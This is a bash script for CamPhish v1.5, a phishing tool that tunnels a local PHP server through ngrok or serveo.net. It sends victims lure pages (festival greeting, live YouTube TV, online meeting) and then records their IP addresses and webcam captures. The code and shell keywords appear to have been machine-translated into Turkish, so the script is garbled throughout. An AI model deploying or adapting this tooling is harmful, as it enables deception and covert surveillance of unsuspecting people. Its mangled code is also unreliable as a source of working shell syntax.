310 satır (245 sloc)  9,6 KB

#! /bin/bash
# CamPhish v1.5
# TechChip tarafından desteklenmektedir
# Krediler thelinuxchoice'e gidiyor [github.com/thelinuxchoice/]

trap  ' printf "\n";durdur ' 2

afiş () {
açık
printf  " \e[1;92m _______ ________ _______ \e[0m\e[1;77m_______ _________ _______ \e[0m\n "
printf  " \e[1;92m ( ____ \( ___ )( )\e[0m\e[1;77m( ____ )|\ /|\__ __/( ____ \|\ /|\e[0m\n] "
printf  " \e[1;92m | ( \/| ( ) || () () |\e[0m\e[1;77m| ( )|| ) ( | ) ( | ( \/| ) ( | \e[0m\n "
printf  " \e[1;92m | | | (___) || || || |\e[0m\e[1;77m| (____)|| (___) | | | | (_____ | (___) |\e[0m\n "
printf  " \e[1;92m | | | ___ || |(_)| |\e[0m\e[1;77m| _____)| ___ | | | (_____ )| ___ |\e[0m\n "
printf  " \e[1;92m | | | ( ) || | | |\e[0m\e[1;77m| ( | ( ) | | | ) || ( ) |\e[0m\n "
printf  " \e[1;92m | (____/\| ) ( || ) ( |\e[0m\e[1;77m| ) | ) ( |___) (___/\____) || ) ( | \e[0m\n "
printf  " \e[1;92m (_______/|/ \||/ \|\e[0m\e[1;77m|/ |/ \|\_______/\_______)|/ \|\e[0m\ n "
printf  " \e[1;93m CamPhish Ver 1.5 \e[0m \n "
printf  " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n "

printf  " \n "


}

bağımlılıklar () {


komut -v php > /dev/null 2>&1  || { echo  >&2  " php'ye ihtiyacım var ama kurulu değil. Kurun. İptal ediliyor. " ;  çıkış 1 ; }
 


}

dur () {

checkngrok= $( ps aux | grep -o " ngrok "  | head -n1 )
checkphp= $( ps aux | grep -o " php "  | kafa -n1 )
checkssh= $( ps aux | grep -o " ssh "  | head -n1 )
if [[ $checkngrok  ==  * ' ngrok ' * ]] ;  sonra
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp  ==  * ' php ' * ]] ;  sonra
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh  ==  * ' ssh ' * ]] ;  sonra
killall -2 ssh > /dev/null 2>&1
fi
çıkış 1

}

catch_ip () {

ip= $( grep -a ' IP: ' ip.txt | cut -d "  " -f2 | tr -d ' \r ' )
IFS= $' \n '
printf  " \e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n] "  $ip

cat ip.txt >> save.ip.txt


}

kontrol bulundu () {

printf  " \n "
printf  " \e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bekleyen hedefler,\e[0m\e[1;77m Çıkmak için Ctrl + C tuşlarına basın ...\e[0m\n "
while [ doğru ] ;  yapmak


if [[ -e  " ip.txt " ]] ;  sonra
printf  " \n\e[1;92m[\e[0m+\e[1;92m] Hedef bağlantıyı açtı!\n "
catch_ip
rm -rf ip.txt

fi

uyku 0,5

if [[ -e  " Log.log " ]] ;  sonra
printf  " \n\e[1;92m[\e[0m+\e[1;92m] Kamera dosyası alındı!\e[0m\n "
rm -rf Günlük.log
fi
uyku 0,5

tamamlamak 

}


sunucu () {

komut -v ssh > /dev/null 2>&1  || { echo  >&2  " ssh istiyorum ama kurulu değil. Kurun. İptal ediliyor. " ;  çıkış 1 ; }

printf  " \e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Serveo Başlatılıyor...\e[0m\n "

if [[ $checkphp  ==  * ' php ' * ]] ;  sonra
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp  ==  true ]] ;  sonra

$( sh ) -c ' ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ' $subdomain ' :80:localhost:3333 serveo.net 2> /dev/null > sendlink '  &

uyku 8
başka
$( sh ) -c ' ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink '  &

uyku 8
fi
printf  " \e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] PHP sunucusu başlatılıyor... (localhost:3333)\e[0m\n "
kaynaştırıcı -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1  &
uyku 3
send_link= $( grep -o " https://[0-9a-z]*\.serveo.net " sendlink )
printf  ' \e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Doğrudan bağlantı:\e[0m\e[1;77m %s\n '  $send_link

}


payload_ngrok () {

link= $( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o ' https://[^/"]*\.ngrok.io ' )
sed ' s+forwarding_link+ ' $bağ ' +g ' template.php > index.php
if [[ $option_tem  -eq 1 ]] ;  sonra
sed ' s+forwarding_link+ ' $bağlantı ' +g ' festivalwishes.html > index3.html
sed ' s+fes_name+ ' $fest_name ' +g ' index3.html > index2.html
elif [[ $option_tem  -eq 2 ]] ;  sonra
sed ' s+forwarding_link+ ' $bağlantı ' +g ' LiveYTTV.html > index3.html
sed ' s+live_yt_tv+ ' $yt_video_ID ' +g ' index3.html > index2.html
başka
sed ' s+forwarding_link+ ' $bağlantı ' +g ' OnlineMeeting.html > index2.html
fi
rm -rf index3.html

}

select_template () {
eğer [ $option_server  -gt 2 ] || [ $option_server  -lt 1] ;  sonra
printf  " \e[1;93m [!] Geçersiz tünel seçeneği! tekrar deneyin\e[0m\n "
uyku 1
açık
afiş
kafur
başka
printf  " \n-----Bir şablon seçin----\n "    
printf  " \n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Dileği\e[0m\n] "
printf  " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Canlı Youtube TV\e[0m\n "
printf  " \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Çevrimiçi Toplantı\e[0m\n "
default_option_template= " 1 "
read -p $' \n\e [1;92m[ \e [0m \e [1;77m+ \e [0m \e [1;92m]] Bir şablon seçin: [Varsayılan 1] \e [0m ' options_tem
options_tem= " ${option_tem :- ${default_option_template} } "
if [[ $option_tem  -eq 1 ]] ;  sonra
read -p $' \n\e [1;92m[ \e [0m \e [1;77m+ \e [0m \e [1;92m] Festival adını girin: \e [0m ' fest_name]
fest_name= " ${fest_name // [[:space:]] / } "
elif [[ $option_tem  -eq 2 ]] ;  sonra
read -p $' \n\e [1;92m[ \e [0m \e [1;77m+ \e [0m \e [1;92m] YouTube video izleme kimliğini girin: \e [0m ' yt_video_ID]
elif [[ $option_tem  -eq 3 ]] ;  sonra
yazdır  " "
başka
printf  " \e[1;93m [!] Geçersiz şablon seçeneği! tekrar deneyin\e[0m\n "
uyku 1
select_template
fi
fi
}

ngrok_server () {


eğer [[ -e ngrok ]] ;  sonra
yankı  " "
başka
komut -v sıkıştırmayı aç > /dev/null 2>&1  || { echo  >&2  " Sıkıştırılmış dosyayı açmam gerekiyor ama kurulu değil. Kurun. İptal ediliyor. " ;  çıkış 1 ; }
komut -v wget > /dev/null 2>&1  || { echo  >&2  " wget'e ihtiyacım var ama kurulu değil. Kurun. İptal ediliyor. " ;  çıkış 1 ; }
printf  " \e[1;92m[\e[0m+\e[1;92m] Ngrok indiriliyor...\n "
kemer= $( uname -a | grep -o ' kol '  | kafa -n1 )
arch2= $( uname -a | grep -o ' Android '  | head -n1 )
if [[ $arch  ==  * ' arm ' * ]] || [[ $arch2  ==  * ' Android ' * ]] ;  sonra
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]] ;  sonra
ngrok-stable-linux-arm.zip > /dev/null 2>&1 dosyasını açın
chmod +x ngrok
rm -rf ngrok-kararlı-linux-arm.zip
başka
printf  " \e[1;93m[!] İndirme hatası... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n "
çıkış 1
fi

başka
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]] ;  sonra
ngrok-stable-linux-386.zip > /dev/null 2>&1 dosyasını açın
chmod +x ngrok
rm -rf ngrok-kararlı-linux-386.zip
başka
printf  " \e[1;93m[!] İndirme hatası... \e[0m\n "
çıkış 1
fi
fi
fi
if [[ -e  ~ /.ngrok2/ngrok.yml ]] ;  sonra
printf  " \e[1;93m[\e[0m*\e[1;93m] ngrok'unuz "
kedi   ~ /.ngrok2/ngrok.yml
read -p $' \n\e [1;92m[ \e [0m+ \e [1;92m] ngrok authtoken'ınızı değiştirmek istiyor musunuz? [E/n]: \e [0m ' chg_token
if [[ $chg_token  ==  " Y "  ||  $chg_token  ==  " y "  ||  $cchg_token  ==  " Evet "  ||  $cchg_token  ==  " evet " ]] ;  sonra
read -p $' \e [1;92m[ \e [0m \e [1;77m+ \e [0m \e [1;92m]] Geçerli ngrok authtoken'ınızı girin: \e [0m ' ngrok_auth
./ngrok authtoken $ngrok_auth  >   /dev/null 2>&1  &
printf  " \e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken değiştirildi\n "
fi
başka
read -p $' \e [1;92m[ \e [0m \e [1;77m+ \e [0m \e [1;92m]] Geçerli ngrok authtoken'ınızı girin: \e [0m ' ngrok_auth
./ngrok authtoken $ngrok_auth  >   /dev/null 2>&1  &
fi
printf  " \e[1;92m[\e[0m+\e[1;92m] PHP sunucusu başlatılıyor...\n "
php -S 127.0.0.1:3333 > /dev/null 2>&1  & 
uyku 2
printf  " \e[1;92m[\e[0m+\e[1;92m] ngrok sunucusu başlatılıyor...\n "
./ngrok http 3333 > /dev/null 2>&1  &
uyku 10

link= $( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o ' https://[^/"]*\.ngrok.io ' )
if [[ -z  " $bağlantı " ]] ;  sonra
printf  " \e[1;31m[!] Doğrudan bağlantı oluşturulmuyor, aşağıdaki olası nedeni kontrol edin \e[0m\n "
printf  " \e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken geçersiz\n "
printf  " \e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Android kullanıyorsanız, etkin noktayı açın\n "
printf  " \e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok zaten çalışıyor, bu komutu çalıştırın killall ngrok\n "
printf  " \e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m İnternet bağlantınızı kontrol edin\n "
çıkış 1
başka
printf  " \e[1;92m[\e[0m*\e[1;92m] Doğrudan bağlantı:\e[0m\e[1;77m %s\e[0m\n "  $bağ
fi
payload_ngrok
kontrol bulundu
}

kafur () {
eğer [[ -e sendlink ]] ;  sonra
rm -rf gönderme bağlantısı
fi

printf  " \n-----Tünel sunucusunu seçin----\n "    
printf  " \n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n "
printf  " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n "
default_option_server= " 1 "
read -p $' \n\e [1;92m[ \e [0m \e [1;77m+ \e [0m \e [1;92m] Bir Bağlantı Noktası Yönlendirme seçeneği seçin: [Varsayılan 1] \e [0m ] ' seçenek_sunucusu
options_server= " ${option_server :- ${default_option_server} } "
select_template
if [[ $option_server  -eq 2 ]] ;  sonra

komut -v php > /dev/null 2>&1  || { echo  >&2  " ssh istiyorum ama kurulu değil. Kurun. İptal ediliyor. " ;  çıkış 1 ; }
Başlat

elif [[ $option_server  -eq 1 ]] ;  sonra
ngrok_server
başka
printf  " \e[1;93m [!] Geçersiz seçenek!\e[0m\n "
uyku 1
açık
kafur
fi

}


yük () {

send_link= $( grep -o " https://[0-9a-z]*\.serveo.net " sendlink )
sed ' s+forwarding_link+ ' $send_link ' +g ' template.php > index.php
if [[ $option_tem  -eq 1 ]] ;  sonra
sed ' s+forwarding_link+ ' $bağlantı ' +g ' festivalwishes.html > index3.html
sed ' s+fes_name+ ' $fest_name ' +g ' index3.html > index2.html
elif [[ $option_tem  -eq 2 ]] ;  sonra
sed ' s+forwarding_link+ ' $bağlantı ' +g ' LiveYTTV.html > index3.html
sed ' s+live_yt_tv+ ' $yt_video_ID ' +g ' index3.html > index2.html
başka
sed ' s+forwarding_link+ ' $bağlantı ' +g ' OnlineMeeting.html > index3.html
sed ' s+live_yt_tv+ ' $yt_video_ID ' +g ' index3.html > index2.html
fi
rm -rf index3.html

}

başlat () {

default_choose_sub= " Y "
default_subdomain= " saycheese $RANDOM "

printf  ' \e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Alt alan seçilsin mi? (Varsayılan:\e[0m\e[1;77m [E/n] \e[0m\e[1;33m): \e[0m '
select_sub'ı oku
select_sub= " ${choose_sub :- ${default_choose_sub} } "
if [[ $choose_sub  ==  " Y "  ||  $choose_sub  ==  " y "  ||  $choose_sub  ==  " Evet "  ||  $choose_sub  ==  " evet " ]] ;  sonra
subdomain_resp=true
printf  ' \e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Alt etki alanı: (Varsayılan:\e[0m\e[1;77m %s \e[ 0m\e[1;33m): \e[0m '  $varsayılan_alt alan adı
alt etki alanını oku
subdomain= " ${subdomain :- ${default_subdomain} } "
fi

sunucu
yük
kontrol bulundu

}

afiş
bağımlılıklar
kafur
